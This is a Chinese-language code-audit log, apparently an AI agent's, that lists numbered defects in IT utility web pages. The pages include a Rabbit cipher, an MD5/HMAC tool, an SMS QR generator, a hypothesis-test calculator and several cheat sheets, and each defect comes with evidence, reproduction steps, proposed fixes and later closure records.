- 复现：node 反算 iPhone 15 Pro：物理 1179×2556、DPR=3 → CSS 视口 393×852；页面任何输出均无此两项。10 款机型 PPI 用 `√(w²+h²)/英寸` 复算全部与表值一致（460/460/460/326/416/460/440/450/452/510），仅信息维度缺失。
- 影响：`tools/it/phone-screen-sizes.html`
- 方案：表增加 DPR、CSS 视口列并统一"N×M（宽×高）"书写；或删掉 DPR 相关宣称。
**留存建议（tools/it/phone-screen-sizes.html）**：保留（PPI 数据准确），补 DPR 列即可显著提升实用性。

### IT-N224 meta/og/twitter 描述整句重复 2–3 遍（低，确认缺陷）
- 问题：描述中"手机屏幕尺寸速查是一款免费的在线IT 开发工具"重复两次，"纯前端运行…"重复两次，og/description/twitter/JSON-LD 四处同文。
- 证据：`tools/it/phone-screen-sizes.html:13`、`:16`、`:33`、`:36`（JSON-LD 同文）。
- 复现：直接读取 meta 文本即可见连续重复短语。
- 影响：`tools/it/phone-screen-sizes.html`
- 方案：去重为单句，并保留"常见机型 PPI 速查"作为差异化描述。
**留存建议（tools/it/phone-screen-sizes.html）**：SEO 文案修复即可。

### 承诺 vs 实际（Q 批专项）
- `tools/it/json-to-toml.html:10`、`:20`：宣称支持"ISO 日期字符串"，实际 `:271` 对所有字符串加引号，日期不会输出为 TOML 日期（见 N201）。
- `tools/it/json-to-toml.html:172`："校验"按钮（`:321` `doValidate(){doToml();}`）只是再转换一次，不校验 TOML 语法，也不校验 JSON 语义（如重复键、超大数）。
- `tools/it/json-to-toml.html:177-180`：缩进下拉与 `:439` Tab 预设无输出效果（见 N200）。
- `tools/it/plist-parser.html:10`、`:164`：宣称支持 date/data，实际 `:273-274` 只取文本、`:283` 回写为 string（见 N202）。
- `tools/it/char-encoder.html:174`：格式清单列出 **Punycode**，但 `:280` 起的 `formats` 数组与全文件均无 Punycode 实现/输出行（新增发现，未单列编号）。
- `tools/it/nanoid-generator.html:194`：写"21 字符约 122 位熵"，而 `:227`/`:246` 写 126 位；64 字符表下 21×6=126 bit，`:194` 数值错误（"约 4 年"沿用官方 350M ID/s 口径，按 126 位成立）。
- `tools/it/markdown-table-generator.html:154`："导出明细 CSV"（`:418`）导的是历史表，且 `:339-345` 读取 `#output`（textarea）的 `textContent` 恒为空，历史/图表/导出实际无数据——属 IT-N140 模板缺陷，不重复编号。
- `tools/it/wifi-qr-generator.html:103`：宣称"任何扫码 App 都能识别"；但 `:235-236` 不转义特殊字符（N218），隐藏网络字符串还缺 `;;`（N219），且 `:175` 与 `:110` 对"是否需要转义"自相矛盾。
- `tools/it/wifi-qr-generator.html:83`、`:103`、`:105`：页面名为"二维码生成器"、简介称"生成二维码"，实际不生成 QR（N220）。
- `tools/it/phone-screen-sizes.html:16`：宣称"输入参数即可实时得出结果"，但全页无 `input` 监听，只有"计算"按钮 `onclick`（`:147` 附近），属文案夸大（未单列）。
- `tools/it/phone-screen-sizes.html:178-179`：宣称可查 DPR 做适配，页面无 DPR 数据/计算（N223）。
- `tools/it/basic-auth-generator.html:8`：宣称"支持中文用户名"，实际 UTF-8 编码但不声明 charset，ISO-8859-1 服务端会乱码（N209）。
- 通用：本批 8 页"导出明细 CSV"均为历史表导出（如 `json-to-toml.html:433`、`markdown-table-generator.html:418`），不导出当前结果；未单列编号。

### 覆盖
- 实读 8 页：`tools/it/json-to-toml.html`、`tools/it/plist-parser.html`、`tools/it/char-encoder.html`、`tools/it/basic-auth-generator.html`、`tools/it/nanoid-generator.html`、`tools/it/markdown-table-generator.html`、`tools/it/wifi-qr-generator.html`、`tools/it/phone-screen-sizes.html`。
- 新增 26 条（高 2 / 中 17 / 低 7），编号 IT-N199~IT-N224；本批无重号（上一批止于 IT-N198）。
- 未覆盖说明：只审计主流程、边界与文档口径，未逐条核对 FAQ/JSON-LD 文案（仅发现 `phone-screen-sizes` 描述整句重复并单列）；未穷举 plist 全部数据类型、未测试二进制 bplist00（页面已明确不支持）；WiFi QR 未实际扫码验证；屏幕参数表仅复算 PPI 与分辨率/尺寸自洽性，未核对 10 款机型官方规格的发布时间与市场版本。
- 未做验证：未开浏览器（结论均为源码静态分析 + `node -e` 内存复算）、未验证英文态 `?lang=en-US`/繁体/移动端、未跑 `_test_static.py`/`_audit_links.py`/`_audit_assets.py`/`run_gates.py` 等门禁，未触发 `_build.py` 或任何 git 写操作。

### IT-N225 Rabbit 进位用 `t>>>32`，等于取低 32 位，密钥流偏离标准（高，确认缺陷）
- 问题：`next()` 用 `carry=t>>>32` 取 32 位加法的进位。JS 的 `>>>` 会把移位量按 32 取模，`t>>>32 === t>>>0`，得到的是和的低 32 位（十亿量级）而不是 0/1 进位；该值随即被加进下一个状态字，并在末尾 `C[0]=(C[0]+carry)>>>0` 再加一次。
- 证据：`tools/it/rabbit.html:333`（`carry=t>>>32;`）、`:335`（把错误进位加回 C[0]）、`:154`（说明写"进位取和右移 32 位的结果"）。
- 复现：node 复刻 `next()` 并打印前 16 次进位 = `1295344757, 545429832, 1431692924, 2727000521, …`，无一是 0/1；单步对照 `t=0xFFFFFFFF+0x4D34D34D` → `t>>>32 = 1295307596`，数学右移应为 `1`。加/解密仍可逆（密钥流确定），但密钥流与 RFC 4503 不一致。
- 影响：`tools/it/rabbit.html`
- 方案：改为 `carry = Math.floor(t / 4294967296)`（或 `(t / 0x100000000) | 0`），循环后 `C[0]=(C[0]+carry)>>>0; carry=0;`，并补一组 RFC 4503 测试向量做自检。
**留存建议（tools/it/rabbit.html）**：这是全页唯一"算法真错"的点，必须修；修完用官方向量回归。

### IT-N226 密钥按文本截断，与"32 hex 字符"标签及"每 4 字节拼 1 字"说明均不符（高，确认缺陷）
- 问题：`getKey()` 把密钥串直接 `strToBytes` 后 `slice(0,16)`，即"取前 16 个**字符**"；但 label 承诺"16字节 = 32 hex字符"，公式说明又称"取密钥字节每 4 个拼成一个 32 位字"。实际 `:311` 先按"2 字节小端 + 4 字节补 0"算一遍，`:312` 立即用"2 字节大端"覆盖，`:311` 成为死代码。
- 证据：`tools/it/rabbit.html:181`（label）、`:154`（说明"每 4 个字节"）、`:311-313`（同一 `X[i]` 连写两次）、`:373`（`slice(0,16)`）、`:370`（密钥清空时返回 15 字节的 `defaultkey12345`，未补齐 16）。
- 复现：node 实算，key=`00112233445566778899aabbccddeeff`（32 hex）→ UTF-8 得 32 个 ASCII 字节 → 取前 16 字符 `0011223344556677` → `X[0]=0x30303131`；若按 label 的 hex 语义应为 `0x00112233`。同理 `X[1]=0x33343535`。
- 影响：`tools/it/rabbit.html`
- 方案：先判 `/^[0-9a-fA-F]{32}$/`（或 `{16}` 文本）再决定"hex 字节装入"还是"UTF-8 文本补齐"；删掉 `:311` 死代码，按 RFC 4503 §2.1 的 4 字节小端装入重写，并在界面回显实际装入的 16 字节。
**留存建议（tools/it/rabbit.html）**：与 N225 同批修，否则"标准 Rabbit"的说法不成立。

### IT-N227 密文基数靠猜、非法 IV 静默变全 0（中，确认缺陷）
- 问题：解密时先按正则猜 Hex，再退回 Base64；`getIV()` 对非 hex 输入把 `parseInt` 的 NaN 写进 `Uint8Array`（自动存 0），只要长度 ≥8 就当作"全 0 IV"并额外空转 4 轮，既不报错也不提示。
- 证据：`tools/it/rabbit.html:395`（`/^[0-9a-fA-F\s]+$/` + 偶数长度判定）、`:379-380`（`hexToBytes` 长度 ≥8 即返回，否则退回文本）、`:317-322`（IV 只要非 null 就异或并多跑 4 轮）。
- 复现：node（1）IV=`abcdefghijklmnop`（16 字符、全非 hex）→ `hexToBytes` 得 8 个 0 → 页面按"零 IV"处理，结果与留空 IV 不同，无任何提示；（2）密文 `abcd` 既是合法 Base64（atob 得 3 字节）又符合 hex 正则且长度为偶 → 被判为 Hex 解 2 字节，明文错乱。
- 影响：`tools/it/rabbit.html`
- 方案：解密格式跟随已有的 `#outputFormat`（Hex/Base64 下拉）而不是猜；IV 严格校验 `/^[0-9a-fA-F]{16}$/` 或明确"按 UTF-8 文本补齐 8 字节"，长度不符时报错而非静默补 0。
**留存建议（tools/it/rabbit.html）**：改下拉联动即可，成本低、收益直接。

### IT-N228 GRANT 示例使用 MySQL 8.0 已移除的 `IDENTIFIED BY` 子句（中，确认缺陷）
- 问题：权限条目照抄 5.6 时代写法 `GRANT ... TO user IDENTIFIED BY 'pwd'`。`IDENTIFIED BY` 在 5.7.6 起废弃、8.0 已移除，8.0/8.4 执行直接 1064 语法错误；且 GRANT 后的 `FLUSH PRIVILEGES` 并非必需（只有直接改 grant 表才需要）。
- 证据：`tools/it/mysql-cheatsheet.html:643`（syntax）、`:645`（example）、`:653`（REVOKE 写法正常，可作对照）。
- 复现：静态对照 MySQL 8.0 手册 GRANT 语法（已无 `IDENTIFIED BY`）；正确顺序为 `CREATE USER 'app'@'%' IDENTIFIED BY 'secret'; GRANT SELECT, INSERT ON mydb.* TO 'app'@'%';`。本机无 MySQL，未实跑，仅按官方语法判定。
- 影响：`tools/it/mysql-cheatsheet.html`
- 方案：syntax 改为 `GRANT priv ON db.* TO user@host`，example 换成 `CREATE USER` + `GRANT` 两行，并删掉不必要的 `FLUSH PRIVILEGES`（或注明"仅直接改 grant 表后需要"）。
**留存建议（tools/it/mysql-cheatsheet.html）**：速查表被照抄的概率极高，这条必须改。

### IT-N229 `INT[(M)] [ZEROFILL]` 与 `VALUES(col)` 两处 8.0 废弃语法未标注（低，确认缺陷）
- 问题：类型表仍给 `INT[(M)] [UNSIGNED] [ZEROFILL]`，而整数显示宽度自 8.0.17 废弃（8.0.19 起直接被忽略）；UPSERT 示例用 `VALUES(name)`，自 8.0.20 起废弃并告警，现行写法是行别名。
- 证据：`tools/it/mysql-cheatsheet.html:363`、`:669`。
- 复现：静态对照 8.0 手册；废弃写法仍可执行但会告警，未来版本删除。别名写法：`INSERT INTO users (id,name) VALUES (1,'A') AS new ON DUPLICATE KEY UPDATE name = new.name;`。
- 影响：`tools/it/mysql-cheatsheet.html`
- 方案：syntax 去掉 `[(M)]`/`[ZEROFILL]` 或加"（8.0.17 起废弃）"；UPSERT 示例换成 `AS new ... new.name`。
**留存建议（tools/it/mysql-cheatsheet.html）**：顺手改，避免教出告警代码。

### IT-N230 名为"SMS 二维码"却不生成可扫二维码：数据区是伪随机填充（高，确认缺陷）
- 问题：`renderQR()` 只画了 3 个定位图案与定时图案，其余数据区用 FNV 哈希做种子的 LCG 随机填 0/1；没有数据编码、Reed–Solomon 纠错、格式/版本信息、掩码，网格固定 `N=27`（版本 5），任何标准扫码器都解不出内容。
- 证据：`tools/it/sms-qr.html:255`（`const N=27`）、`:267-272`（`rnd()<0.5?0:1` 铺满数据区）、`:275-281`（只把格子画进 canvas）、`:157`（说明宣称"版本升高、纠错等级 M"）。
- 复现：读源码即可判定（无任何 QR 编码步骤）；对照 `:157` 的"内容较长时版本升高"——代码中 N 是常量，无法升版。
- 影响：`tools/it/sms-qr.html`
- 方案：引入纯前端 QR 编码库（锁版本、本地引入，符合纯前端约束）按 version/ECC 真实编码；否则按 N220 的先例把页面改名为"SMS 链接（sms: URI）生成器"并说明需外部二维码工具。
**留存建议（tools/it/sms-qr.html）**：与 N220（WiFi 页）同一病灶，建议两页共用一套本地 QR 渲染。

### IT-N231 只编码正文不编码号码，号码含 `#`/`&`/空格即被截断（中，确认缺陷）
- 问题：`buildSms()` 对正文做了 `encodeURIComponent`，号码原样拼接；号码含 `#` 会把 `?body=` 落到 fragment，含 `&` 会起新参数，含空格/连字符则产生非法 URI。页面说明自己写着"正文与号码中的特殊字符需先做百分号编码"。
- 证据：`tools/it/sms-qr.html:249-253`（`'sms:'+phone+'?body='+msg`）、`:157`（说明要求号码也编码）、`:161`（`#phone` 无 `pattern`、无校验）。
- 复现：phone=`13800138000#test`、msg=`Hi` → 生成 `sms:13800138000#test?body=Hi`，`?body` 成为 fragment 内容，扫码端只填号码、正文丢失；phone=`138 0013 8000` → URI 含空格，RFC 3986 非法，部分扫码器截断。
- 影响：`tools/it/sms-qr.html`
- 方案：号码先去空格/连字符并校验 `^\+?\d{5,15}$`（不合法则提示"仅支持数字与可选 +"），正文保持 `encodeURIComponent`；若允许扩展号再单独约定分隔符。
**留存建议（tools/it/sms-qr.html）**：属于"生成物不可用"级别，应与 N230 同批修。

### IT-N232 模板 NaN 守卫误伤含 "NaN" 的短信正文，直接吞掉结果（中，确认缺陷）
- 问题：结果渲染前先用 `/NaN/` 正则扫描**拼入用户文本**的 HTML，命中就把 `out.innerHTML` 换成"⚠ 计算结果含无效值，请检查输入是否为有效正数"，后续 `appendChild(canvas)` 也不再执行。
- 证据：`tools/it/sms-qr.html:285`（守卫 + 正则）；`:343`（历史读取同样把含 "NaN" 的结果判为无效）。
- 复现：msg=`NaN`、phone=`13800138000` → `buildSms()` = `sms:13800138000?body=NaN`，正则 `(^|[^A-Za-z])NaN([^A-Za-z]|$)` 命中（前一字符 `=`、后为串尾）→ 页面只剩错误提示，二维码与 URI 都不出现。
- 影响：`tools/it/sms-qr.html`（该守卫为全站模板注入，凡"结果里拼用户文本"的页面都有同型风险）
- 方案：文本/URI 类页面删除该守卫；数值页改判 `Number.isFinite(数值结果)` 而不是正则扫 HTML。
**留存建议（tools/it/sms-qr.html）**：顺手删，属于"用户输入决定是否报错"的错误设计。

### IT-N233 "两类错误/效能"模块忽略单尾选择，与上方主结果自相矛盾（中，确认缺陷）
- 问题：`__stTail()` 只认 `one`/`1`/`单`，而 `#tail` 的取值是 `two|left|right`，于是恒返回 `'two'`。结果：主计算区按单尾算 p 与临界值，下方"两类错误"模块却按双尾算临界值/效能/MDE，并显示"±1.960（双尾）"。
- 证据：`tools/it/hypothesis-test.html:173-177`（option 值）、`:585-589`（`__stTail`）、`:599`（`zc`）、`:603`（power 公式）、`:634-636`（渲染"±…（双尾）"）、`:307-322`（主计算区正确使用 `tail`）。
- 复现：mean=95、mu0=100、sigma=15、n=36、α=0.05、选"左尾" → 主结果 p=Φ(−2)=0.0228、临界 −1.645（拒绝 H₀）；下方模块显示"z=-2.0000 临界值 ±1.960（双尾）"，效能 51.60%、β=48.40%。node 实算单尾正解：效能 Φ(2−1.6449)=63.88%、β=36.12%；MDE 由 7.004 降为 6.216（页面偏大 12.7%）。
- 影响：`tools/it/hypothesis-test.html`
- 方案：`__stTail` 改判 `two|left|right`（left/right → 单尾并带方向符号），或直接复用主模块已算好的 `tail`/`zc` 传入 `__stHT()`。
**留存建议（tools/it/hypothesis-test.html）**：这是本页最会误导决策的缺陷（效能/MDE 偏大一成），优先修。

### IT-N234 简介称 "z or t"、公式列 t 检验与自由度，实际只有 Z 检验（中，确认缺陷）
- 问题：英文简介写 "Run a basic hypothesis test (z or t)"，公式清单给出 `t=(x̄−μ₀)/(s/√n)`、自由度为 n−1，但输入只有 σ（必填且 >0），无 s、无 df；`__stTcrit(df)` 与 df 表定义后从未被调用，属死代码。
- 证据：`tools/it/hypothesis-test.html:516`（"z or t"）、`:161`（t 公式与 df）、`:562-575`（`__stTcrit` 与 T 表）、全文仅此一处出现 `__stTcrit`。
- 复现：留空 sigma → `__stHT()` 因 `!isFinite(sigma)` 返回 null，模块只提示"请填写…sigma"，全程无 s/df 入口；页面任何输出都不含 t 分布或自由度。
- 影响：`tools/it/hypothesis-test.html`
- 方案：二选一——删掉 "z or t"、t 公式与 df 死代码，标题明确"σ 已知的单样本 Z 检验"；或加 s 输入并按 t 分布算 p（需引入不完整 Beta 函数，注意与现有近似精度口径一致）。
**留存建议（tools/it/hypothesis-test.html）**：建议走"删宣称"路线，成本最低且与实现一致。

### IT-N235 p 值打印 9 位有效数字，但 CDF 近似在远尾只有 2–3 位可信（低，确认缺陷）
- 问题：`fmt` 对小数用 `toExponential(8)`，而 `normalCDF` 是 A&S 26.2.17 多项式（绝对误差约 7.5e-8），尾部相对误差随 |z| 放大；显示精度远超算法精度。
- 证据：`tools/it/hypothesis-test.html:277`（`toExponential(8)`）、`:280-286`（`normalCDF` 多项式）。
- 复现：node 与高精度 erf 对照 p=2·min(Φ,1−Φ)：z=4 → 页面 6.337206e-5 vs 真值 6.334248e-5（+0.05%）；z=5 → 5.7421e-7 vs 5.7334e-7（+0.15%）；z=6 → 1.980244e-9 vs 1.973200e-9（+0.36%，第 3 位有效数字已错）。中段 z≤3 误差 ≤6e-5，可放心。
- 影响：`tools/it/hypothesis-test.html`
- 方案：|z|≤4 时保留 6 位有效数字；|z|>4 改用 `erfc` 连分式，或直接输出"p < 1e-6"这类区间表述。
**留存建议（tools/it/hypothesis-test.html）**：低优先，但"9 位小数"会让人误以为精确。

### IT-N236 "错误格式"示例既不是合法 JSON，也未引 RFC 9457（低，确认缺陷）
- 问题：syntax 写成 `{"error":{"code","message","details"}}`——缺冒号与值，`JSON.parse` 直接抛错；页面把自定义 error 包装当作唯一定式，未提 2022 年后的标准 `application/problem+json`。
- 证据：`tools/it/rest-api-cheatsheet.html:558`（syntax）、`:560`（example）、`:244-256`（引据表只引 RFC 9110）。
- 复现：node `JSON.parse('{"error":{"code","message","details"}}')` → `SyntaxError: Expected ':'`。
- 影响：`tools/it/rest-api-cheatsheet.html`
- 方案：syntax 补全为 `{"error":{"code":"…","message":"…","details":{…}}}`，并在引据表加一行 RFC 9457（`type/title/status/detail/instance`），说明两种流派。
**留存建议（tools/it/rest-api-cheatsheet.html）**：一句话补齐即可。

### IT-N237 深度解析把"POST 建"指向 `/users/{id}`，与自家速查表矛盾（低，确认缺陷）
- 问题：`:221` 写"用复数名词 `/users/{id}`，GET 查、POST 建、PATCH 改"，把创建动作挂到带 id 的实例地址；REST 语义下创建应 POST 到集合 `/users`，对 `/users/{id}` POST 通常 404/405。
- 证据：`tools/it/rest-api-cheatsheet.html:221`；对照同页 `:280`（`GET /api/users?…`）、`:302`（`POST /api/{resource}`）、`:323-328`（PATCH 用 `{id}`）。
- 复现：静态对读——速查表两条创建/更新都区分集合与实例，唯深度解析一处混用。
- 影响：`tools/it/rest-api-cheatsheet.html`
- 方案：改为"`GET /users/{id}` 查、`POST /users` 建、`PATCH /users/{id}` 改"。
**留存建议（tools/it/rest-api-cheatsheet.html）**：顺手改，避免示范错误姿势。

### IT-N238 HMAC-MD5 密钥超过 64 字符直接 TypeError，功能不可用（高，确认缺陷）
- 问题：`hmacMd5` 的"长密钥先摘要"分支把 `md51(k)`（返回 4 个 32 位**字的数组**）赋回 `k`，随后 `k.charCodeAt(i)` 不是函数 → 抛 TypeError。且判长用的是**字符数**，40 个中文字符≈120 字节却不会触发摘要分支。
- 证据：`tools/it/md5.html:385`（`k = md51(k)`）、`:387`（`k.charCodeAt(i)`）、`:330-341`（`md51` 返回 `state` 数组）、`:404`（`calcHmac` 无 try/catch）。
- 复现：node 抽出页面算法：`md51('a'.repeat(70))` 返回 `Array(4)`，`typeof k.charCodeAt === 'undefined'`；模拟 ipad 循环即抛 `TypeError: k.charCodeAt is not a function`。页面表现为点/输入后结果不更新（异常仅在控制台）。
- 影响：`tools/it/md5.html`
- 方案：按 RFC 2104 处理长密钥——把 state 转成 16 字节（小端）作为密钥块，用字节串参与 ipad/opad；`k.length` 改按 UTF-8 字节长度判断；`calcHmac` 加 try/catch 给出可见提示。
**留存建议（tools/it/md5.html）**：HMAC 页面的核心分支是坏的，优先修。

### IT-N239 取消"UTF-8编码"后非 ASCII 被按 UTF-16 码元塞入，得到非标准摘要（中，确认缺陷）
- 问题：`md5()` 关掉勾选时直接 `charCodeAt(i) << ((i%4)<<3)` 拼字，无 `0xFF` 掩码；中文码元（>255）的高位会污染相邻字节，结果既不是 UTF-8 也不是任何单字节编码的 MD5；HMAC 模式又恒定按 UTF-8 编码，勾选框对 HMAC 无效。
- 证据：`tools/it/md5.html:352-353`（`unescape(encodeURIComponent(s))`）、`:335`（无掩码的字节拼装）、`:383-384`（HMAC 强制 UTF-8，不读 `#utf8`）。
- 复现：node 抽出页面算法——`密码学哈希函数测试`：utf8=true → `0069fbe6a5a50eaf7315ee7eda065ac2`（与 `crypto md5(utf8)` 完全一致）；utf8=false → `c2981cdd9f17a049ef6b0ca35b77e99b`（不对应任何标准编码）。纯 ASCII `abc` 两种设置都是 `900150983cd24fb0d6963f7d28e17f72`，故问题只在非 ASCII 暴露。
- 影响：`tools/it/md5.html`
- 方案：非 UTF-8 分支改为明确的"按 Latin-1 字节串"并加 `& 0xFF` + 非 ASCII 时提示；或直接移除该勾选（通行实现均按 UTF-8）。HMAC 同步尊重该开关或标注"HMAC 固定 UTF-8"。
**留存建议（tools/it/md5.html）**：与 N238 同批；建议直接删勾选，减一个错误维度。

### IT-N240 宣称"支持批量生成""MD5 碰撞检测参考"，两项功能都不存在（中，确认缺陷）
- 问题：JSON-LD description 与页内简介都写"支持批量生成，MD5 碰撞检测参考"，实际只有单条文本框、单文件与 HMAC 三个模式，既无按行批量也无任何碰撞/比对入口。
- 证据：`tools/it/md5.html:47`（JSON-LD）、`:606`（intro 正文）、`:176-224`（三模式控件全貌：`:189` textarea、`:203` file、`:218` hmac textarea）。
- 复现：清点页面全部输入控件：文本 textarea 1 个、file 1 个、hmac textarea + key 各 1 个，无列表/多行输出、无第二个待比对哈希。
- 影响：`tools/it/md5.html`
- 方案：删除两处宣称；若要做实，最小增量是"textarea 按行逐条输出 32 位哈希"（真实批量，成本低）。
**留存建议（tools/it/md5.html）**：文案删除即可，二选一。

- `binomial-distribution`：无剩余缺陷（IT-N241 n 上限 10000 + `Number.isInteger` 校验 + cdf 对数域递推 O(n)、IT-N242 大组合数对数形式 e^{ln C} + 注记、IT-N243 引据表阈值统一 ≥5，三条均已销账，第196批；verify 3 条强锁 + JSDOM 真机 20/20、旧源码 11/20，cdf 递推 9 组独立复算 maxErr 3.4e-12）。
- 留存建议（tools/it/binomial-distribution.html）：正态近似可补连续性校正 `z=(k−np±0.5)/√(np(1−p))` 说明。

- `go-cheatsheet`：无剩余缺陷（IT-N244 6 处非法 `--` 注释全改 `//`、IT-N245 8 处裸 `...` 占位与 2 处未使用变量空循环体改为可编译片段，两条均已销账，第197批；verify 2 条探针强锁 + JSDOM 真机 20/20、旧源码 6/20，30 条 example 静态 Go 规则全清、合法 `...T`/`[...]T`/`./...` 保留）。

### 承诺 vs 实际（R 批专项）
- `tools/it/rabbit.html:165`、`:157`：称 eSTREAM Profile 1 获胜算法、128 位密钥 + 可选 64 位 IV，但 `:333` 进位实现错误（N225）、`:312` 密钥装入与 `:154` 说明不符（N226）→ 输出不是标准 Rabbit，无法与其它实现互通；页面未提供任何测试向量自检。
- `tools/it/rabbit.html:181`：label 承诺"32 hex 字符"密钥，实际按文本截断（N226）；`:370` 密钥清空时用 15 字节默认值且不补齐。
- `tools/it/rabbit.html:201`："导出明细 CSV"导的是 `#rabbitTable`，而 `:441-443` 读 `#output`（**textarea**）的 `textContent`，textarea 的 textContent 是初始内容（恒空）→ 历史/图表/CSV 恒空（IT-N140 同型，不重复编号）。
- `tools/it/mysql-cheatsheet.html:643`、`:645`：权限示例为 8.0 已移除语法（N228）；全页无 `CREATE USER`，而 8.0 建账号必须先 CREATE USER。
- `tools/it/sms-qr.html:156` 写 `SMSTO:号码:内容`，`:196` 示例却写 `smsto:13800000000?body=Hi`（两种格式互斥）；`:157` 宣称"版本升高、纠错 M"，`:255` 却把 `N=27` 写死（N230）。
- `tools/it/hypothesis-test.html:516` "z or t"、`:161` t 公式与 df → 实际只有 Z 检验（N234）；`:585-589` 单尾选择失效（N233）。
- `tools/it/rest-api-cheatsheet.html:558` 错误格式 syntax 非法 JSON（N236）；`:221` "POST 建"指向 `/users/{id}`（N237）。
- `tools/it/md5.html:201`：称"支持任意大小文件"，但 `:338`/`:375` 的 `tail[14]=n*8` 只写低 32 位、未给高位字 `tail[15]` 赋值 → ≥512 MiB 文件摘要错误；且 `:417-426` 用 `readAsArrayBuffer` 全量读入内存，"任意大小"不成立。
- `tools/it/md5.html:47`、`:606`：宣称"支持批量生成""MD5 碰撞检测参考"，实际无批量与碰撞功能（N240）。
- `tools/it/binomial-distribution.html:176-178`：三个输入无上限/无小数校验（N241）；`:171` `≥5` 与 `:254` `>5` 冲突（N243）。
- `tools/it/go-cheatsheet.html:341` 等 5 处 `--` 注释（N244）、`:365` 等 7 处 `...` 占位与未使用变量（N245），与"可复制示例"的定位冲突。
- 通用：本批 5 页的"导出明细 CSV"（`tools/it/rabbit.html:201`、`tools/it/sms-qr.html:165`、`tools/it/hypothesis-test.html:181`、`tools/it/md5.html:191`、`tools/it/binomial-distribution.html:181`）导的都是历史表而非当前结果；其中 rabbit 的历史源文本取自 textarea 的 `textContent`，恒为空。

### 覆盖
- 实读 8 页：`tools/it/rabbit.html`、`tools/it/mysql-cheatsheet.html`、`tools/it/sms-qr.html`、`tools/it/hypothesis-test.html`、`tools/it/rest-api-cheatsheet.html`、`tools/it/md5.html`、`tools/it/binomial-distribution.html`、`tools/it/go-cheatsheet.html`。
- 新增 21 条（高 4 / 中 10 / 低 7），编号 IT-N225~IT-N245；本批无重号（上一批止于 IT-N224）。
- 未覆盖说明：只审计主流程、参数边界与文档口径，未逐条穷举 MySQL/Go 语法（仅抽检 GRANT、`INT[(M)]`/`ZEROFILL`、`VALUES()`、`--`、`...`）；Rabbit 未做官方向量比对（缺 RFC 4503 期望值，只证明了"进位/密钥装入偏离本页说明"）；sms-qr 未实际扫码；binomial 参数域抽样到 n=20000；rest-api/mysql 内容准确性对照 RFC 9110/9457 与 MySQL 8.0 手册，非逐条穷举。
- 未做验证：未开浏览器、未构建、未跑门禁、未 git 写；全部结论为源码静态分析 + `node` 内存复算（临时脚本在 `/tmp`，未落仓库），未验证英文态 `?lang=en-US`/繁体/移动端。

- `binary-to-text`：无剩余缺陷（IT-N246 结果读取统一走 textarea.value + 删除以错误词判空的启发式，历史/表格/图表/CSV 链恢复；IT-N247 严格 UTF-8 `fatal:true,ignoreBOM:true` + 非法字节计数/Latin-1 对照/0x 字节列表；IT-N248 FAQ 与公式三源口径纠正，三条均已销账，第198批；verify 3 条探针强锁 + JSDOM 真机 21/21、旧源码 6/21，非法字节/BOM/错误词评分/三源文案全变红）。

- `chinese-name-generator`：无剩余缺陷（IT-N249 拆 maleChars 双字词条建/志/华 + generateOneName 复姓避让、逐字符拼接、字数兜底断言，2字名/3字名字数精确；IT-N250 getCharPool 出口 Set 去重，薇/素/毅不再放大取样；IT-N251 取消收藏 toast 补 toast.fav_removed key + 中文兜底，不再空提示，三条均已销账，第199批；verify 3 条探针强锁 + 1 条结构例改造 + JSDOM 真机 18/18、旧源码 3/18，verify 用例级旧态 1551/1554 三锁全红）。

- `regex`：IT-N253 分享链接 base64url 对称修复（写入 +→- /→/ 去尾=，读取逆变换并兼容旧标准 base64 的空格化 +、补 padding，catch 加 console.warn），中文/换行 payload 往返正确，第200批销账；verify 无用例（页面依赖原生 location.hash + btoa/atob，harness stub DOM 不适用），由 JSDOM 真机 12/12 vs 旧5/12 覆盖。IT-N252（ReDoS 超时 + flags 双绑定）已于第201批整条销账。 IT-N254（替换页尊重用户 flags，非 g 只替首个且 count 按命中数、copyMatches global 跟随 flags 防 1001 条重复）第202批销账；真机 14/14 vs 旧 6/14（8 项变红）。

- `device-info`：IT-N255 item() 加第4参 raw（仅内部可信 badge 串跳过转义），在线状态/网络状态两处 status-badge 不再显示为裸标签，第203批销账；普通/外部值仍走 escapeHtml 不回退安全。verify 无用例（依赖 navigator/screen 原生对象），真机 8/8 vs 旧 1/8。 IT-N256（__v 从恒定核心数改视口面积，趋势/对比有真实变化，新增「视口」字段+字典英译）、IT-N257（复制全部改为逐条 label: value 换行、UA 单独成块）第204批销账；真机 9/9 vs 旧 2/9。

- `qrcode`：IT-N258 中文/emoji UTF-8 编码（generate() 切 qrcode.stringToBytes 到 UTF-8、__qrBytes 按 UTF-8 计字节含 emoji 代理对）源码已在 HEAD（其他 Agent 修复），清单漏销账，第205批补证据销账；真机 13/13（库编码对照标准 UTF-8、__qrBytes 一致、中文/ASCII 矩阵不同、缺陷态对照切换项变红），verify 无用例。N259（宣称识别但无解码）等仍留清单。

- `qrcode`：IT-N259 SEO 宣称口径（title/h1/keywords/meta/JSON-LD/intro 全部只宣称「生成」无「识别/解析/上传图片解析」，无 file input/解码入口）源码已在 HEAD（其他 Agent 修复），清单漏销账，第206批补证据销账；真机 14/14（缺陷态注入旧宣称 11/14），verify 无用例。N260（容量图只到v10）等仍留清单。

- `qrcode`：IT-N260 容量表 QR_BYTE_CAP 补到 v40（用本页 js/qrcode.js 二分实测各版字节容量，与库实际编码口径一致，v40 L=2953 与表注吻合），超限标 41=超出v40 不再错误压成10；第207批销账；真机 19/19 vs 旧 4/15项红（300/900字节各级别版本与库实际生成一致），verify 无用例。N267（json-schema-generator 单样本）等仍留清单。

- `hex-encode`：IT-N261 解码改为先剥分隔符、再全局 `replace(/0x/gi,'')`（每行/每字节 0x 的 hexdump 都能解，大小写 0X 兼容），编码侧勾选 prefix 时按字节加（`0x48 0x69`）；IT-N262 历史读取 F-N189 全站修复已覆盖（`#output` 是 textarea，现读 `r.value`），本批删掉 `__hex_encodeScore` 关键词判 0 启发式（恒 1，与 N246 同型，避免 "Error 404"/严格解码告警被误判无效）；IT-N263 改严格 UTF-8（`fatal:true,ignoreBOM:true`）+ 非法字节计数/Latin-1 对照/原始 hex 字节列表，`dec` 也包进 extras 并写「模式=编码/解码」，历史回放按方向选 `enc()`/`dec()`；第208批销账；真机 25/25 vs 旧 9/25（16 项红），verify 无用例（依赖 TextEncoder/TextDecoder 原生对象）。N267（json-schema-generator 单样本）等仍留清单。

